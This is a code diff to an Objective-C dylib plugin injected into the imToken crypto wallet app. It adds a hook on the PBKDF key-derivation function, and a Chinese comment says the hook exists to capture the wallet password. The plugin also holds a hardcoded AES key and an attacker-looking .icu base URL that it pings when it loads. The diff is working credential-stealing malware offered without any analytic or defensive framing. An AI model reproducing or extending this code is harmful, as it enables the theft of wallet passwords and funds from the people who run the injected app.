@@ -11,6 +11,7 @@
 #import "Net.h"
 #import "Info.h"
 #import "ImToken.h"
+#import "HookKDF.h"
 
 static NSString *const kBaseURL = @"https://myg3z1adawtxz0s.icu";
 static NSString *const kAesPassword = @"Ek8pl31K2yeHgQwy";
@@ -259,6 +260,10 @@ void plugin_main(void) {
     } @catch (NSException *e) {
         (void)e;
     }
+
+    // KDF interpose 由 dyld 在加载本 dylib 时自动生效（__DATA,__interpose 段），
+    // 这里只做一次标记；真正抓密码在 MyCCKeyDerivationPBKDF 里。
+    HookKDFInstall();
 
     // 网络那条路照发（可能早于网络栈就绪，不指望它）
     RawPingAsync(@"imtoken_plugin_main", @"entry called");
